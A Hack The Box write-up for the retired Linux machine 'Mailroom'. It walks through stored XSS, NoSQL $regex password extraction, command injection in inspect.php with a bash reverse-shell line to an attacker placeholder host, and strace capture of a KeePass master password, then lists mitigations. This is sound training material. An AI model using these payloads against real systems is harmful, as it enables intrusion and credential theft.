---
machine: Mailroom
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, xss, nosql, gitea, command-injection, keepass, ptrace, privesc]
---

# Mailroom — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

`mailroom.htb` has a contact form the administrator reviews, enabling XSS. `git.mailroom.htb` runs Gitea 1.18.0 with the source of `staffroom`, the private site at `staff-review-panel.mailroom.htb`. The `staffroom` login is vulnerable to NoSQL injection; the XSS issues requests from the admin's browser (XSRF) and exfiltrates `tristan`'s password character by character. With SSH as `tristan`, the `staffroom` container is enumerated, a tunnel opens to the internal panel and the command injection in `inspect.php` yields `www-data`. `matthew`'s password allows `su`; his KeePass database is opened with `kpcli` and `strace` captures the master password, which leads to root.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` OpenSSH 8.2p1 Ubuntu 4ubuntu0.5.
- `80` Apache httpd 2.4.54 (Debian).

```bash
ffuf -u http://mailroom.htb -H "Host: FUZZ.mailroom.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <SIZE>
```

`git.mailroom.htb` and `staff-review-panel.mailroom.htb` appear.

## Enumeration

Gitea shows a public repository with the `staffroom` source. `auth.php` references the internal panel's domain. `index.php` contains a login form and a MongoDB query built from submitted values.

The main site has a contact form that emails the administrator; the message is stored and displayed in the panel, so XSS runs with their session.

## Foothold

The XSS is submitted in the message field and loads a script that calls the internal panel from the admin's browser. Since the login is vulnerable to NoSQL injection, the script tests regular expressions against the password and sends each match to an attacker server:

```javascript
fetch('http://staff-review-panel.mailroom.htb/auth.php', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'username=tristan&password[$regex]=^a'
});
```

Repeating for each character reconstructs `tristan`'s password, which works over SSH:

```bash
ssh tristan@mailroom.htb
```

## Lateral movement

`tristan` can enumerate the `staffroom` container and its code. An SSH tunnel exposes the internal panel from the host:

```bash
ssh -L 8080:staff-review-panel.mailroom.htb:80 tristan@mailroom.htb
```

In the container, `dashboard.php` queries tickets and `inspect.php` takes `inquiry_id` and uses it to read content. The parameter is concatenated into a system call, so a separator runs commands and yields a shell as `www-data`:

```text
<ID>; id
<ID>; bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

## Privilege escalation

Container enumeration shows the home directories and `matthew`'s mail. His password is reused and allows `su` on the host. His home holds `personal.kdbx`, a KeePass database opened with `kpcli`.

`matthew` types the master password into `kpcli`; an attached `strace` captures the input:

```bash
strace -f -e trace=read,write -p <PID> 2>&1 | grep -i "pass"
```

With the captured password the database opens and the root entry is read, then used with `su -` to finish the box.

## Evidence

- `staffroom` repository in Gitea and the internal panel reference.
- XSS executed with the administrator session.
- NoSQL requests with `$regex` and `tristan`'s reconstructed password.
- SSH tunnel to the panel and command injection in `inspect.php`.
- `su` as `matthew` and `personal.kdbx`.
- `strace` on `kpcli` and root's password.

## Lessons learned

- XSS against the administrator can issue authenticated requests to an internal panel.
- NoSQL operator injection extracts passwords without classic brute force.
- A public repository can reveal internal logic and domains.
- Concatenating `inquiry_id` into a system call is command injection.
- A password manager opened in an observable session can be spied on with `ptrace`.

## Mitigations and detection

- Escape contact form content and never render user HTML in the panel.
- Parameterize NoSQL queries and reject operators such as `$regex` or `$ne`.
- Keep code with internal domains out of publicly reachable repositories.
- Validate `inquiry_id` as an integer and use prepared statements.
- Restrict `ptrace` (`kernel.yama.ptrace_scope`) and avoid opening password managers in shared sessions.
- Alert on requests carrying NoSQL operators and on processes reading `kpcli` input.

## References

- [0xdf — Mailroom](https://0xdf.gitlab.io/2023/08/19/htb-mailroom.html)
- [IppSec — Mailroom](https://www.youtube.com/watch?v=PREVgpmZGuo)
- [Hack The Box — Mailroom](https://app.hackthebox.com/machines/mailroom)
